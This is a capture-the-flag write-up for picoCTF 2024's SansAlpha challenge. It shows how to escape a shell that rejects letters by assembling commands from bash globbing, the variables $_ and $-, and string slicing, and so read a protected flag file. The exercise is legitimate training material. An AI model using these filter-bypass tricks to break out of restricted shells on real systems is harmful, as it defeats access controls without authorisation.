# SansAlpha

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information

```text
Level: Medium
Tags: General Skills, picoCTF 2024, bash, ssh, browser_webshell_solvable, shell_escape
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Author: LOIC SHEMA / SYREAL

Description:
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of 
the multiverse is in a universe where keyboards only have numbers and (most) symbols.

ssh -p 61383 ctf-player@mimas.picoctf.net
Use password: 83dcefb7

Hints:
1. Where can you get some letters?
```

Challenge link: [https://play.picoctf.org/practice/challenge/436](https://play.picoctf.org/practice/challenge/436)

## Solution

### Connect to the site

We begin by connecting to the site

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/SansAlpha]
└─$ ssh -p 61383 ctf-player@mimas.picoctf.net
The authenticity of host '[mimas.picoctf.net]:61383 ([52.15.88.75]:61383)' can't be established.
ED25519 key fingerprint is SHA256:n/hDgUtuTTF85Id7k2fxmHvb6rrLrACHNM6xLZ46AqQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[mimas.picoctf.net]:61383' (ED25519) to the list of known hosts.
ctf-player@mimas.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SansAlpha$ ls -la
SansAlpha: Unknown character detected
SansAlpha$ id
SansAlpha: Unknown character detected
SansAlpha$ 
```

Hhm, we have a weird non-standard shell.

### Trying to understand the shell

Now we try to understand the shell and do some basic enumeration.  
Maybe we can `quote` the commands?

```bash
SansAlpha$ "ls"
SansAlpha: Unknown character detected
SansAlpha$ 'ls'
SansAlpha: Unknown character detected
SansAlpha$ 
```

Nope.

Can we use [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)?

```text
SansAlpha$ $(ls)
SansAlpha: Unknown character detected
SansAlpha$ `ls`
SansAlpha: Unknown character detected
SansAlpha$  
```

Not that either.

We can run `exit` though

```bash
SansAlpha$ exit
Connection to mimas.picoctf.net closed.

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/SansAlpha]
└─$ 
```

but that isn't very helpful.

Entering an empty command reveal the name of the running script (`/usr/local/sansalpha.py`) when erroring out

```bash
SansAlpha$ 
Traceback (most recent call last):
  File "/usr/local/sansalpha.py", line 12, in <module>
    if user_in[-1] != "\n":
IndexError: string index out of range
Connection to mimas.picoctf.net closed.
```

### Listing files

If we type `*` we will try to execute the first file/directory in the current directory with all the other files and directories as arguments

```bash
SansAlpha$ *
bash: blargh: command not found
```

Then we can use `$_` which is a [special variable/parameter in bash](https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html) that holds the last argument of the previous command

```bash
SansAlpha$ $_
bash: on-calastran.txt: command not found
```

So the last file in the current directory is `on-calastran.txt`.

If we run `*/*` we can see that `blargh` is a directory containing the `flag.txt` file

```bash
SansAlpha$ */*
bash: blargh/flag.txt: Permission denied
```

There is also an `on-alpha-9.txt` file in the `blargh` directory

```bash
SansAlpha$ */*; $_
bash: blargh/flag.txt: Permission denied
bash: blargh/on-alpha-9.txt: Permission denied
```

Another variable we can use is `$-` that holds the current set of options in your current shell

```bash
SansAlpha$ $-
bash: himBHs: command not found
```

### Extracting characters

Following the challenge hint we can extract characters from variables with [parameter expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html) on the form `${parameter:offset:length}`. Like this

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/SansAlpha]
└─$ CAJAC=abcdefghijklmnopqrstuvwxyz

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/SansAlpha]
└─$ echo ${CAJAC:0:3}
abc

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/SansAlpha]
└─$ echo ${CAJAC:0:5}
abcde

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/SansAlpha]
└─$ echo ${CAJAC:3:10}
defghijklm
```

It works more or less like slicing of strings in Python.

If we combine a lot of tricks, i.e. quoting, command substitution, parameter expansion and redirection of stderr to stdout, we can extract whatever characters we have from our shell variables, including any error messages.

For example, we can execute `id` from the `$-` variable

```bash
SansAlpha$ "$($- 2>&1)"; ${_:7:1}${_:20:1}
bash: bash: himBHs: command not found: command not found
uid=1000(ctf-player) gid=1000(ctf-player) groups=1000(ctf-player)
```

Or execute `cat *` by extracting characters from the `on-calastran.txt` file

```bash
SansAlpha$ *; ${_:3:2}${_:8:1} *
bash: blargh: command not found
cat: blargh: Is a directory
The Calastran multiverse is a complex and interconnected web of realities, each
with its own distinct characteristics and rules. At its core is the Nexus, a
cosmic hub that serves as the anchor point for countless universes and
dimensions. These realities are organized into Layers, with each Layer
representing a unique level of existence, ranging from the fundamental building
blocks of reality to the most intricate and fantastical realms. Travel between
Layers is facilitated by Quantum Bridges, mysterious conduits that allow
individuals to navigate the multiverse. Notably, the Calastran multiverse
exhibits a dynamic nature, with the Fabric of Reality continuously shifting and
evolving. Within this vast tapestry, there exist Nexus Nodes, focal points of
immense energy that hold sway over the destinies of entire universes. The
enigmatic Watchers, ancient beings attuned to the ebb and flow of the
multiverse, observe and influence key events. While the structure of Calastran
embraces diversity, it also poses challenges, as the delicate balance between
the Layers requires vigilance to prevent catastrophic breaches and maintain the
cosmic harmony.
```

### Get the flag

Finally, to get the flag we can issue `cat */????.???`

```bash
SansAlpha$ *; ${_:3:2}${_:8:1} */????.???
bash: blargh: command not found
return 0 picoCTF{<REDECTED>}
```

For additional information, please see the references below.

## References

- [Command substitution - Bash Manual](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
- [Difference between $_ and $- variables in Linux](https://medium.com/@linuxschooltech/difference-between-and-variables-in-linux-cd9153b74751)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Shell Parameter Expansion - Bash Manual](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
- [Special parameters - Bash Manual](https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
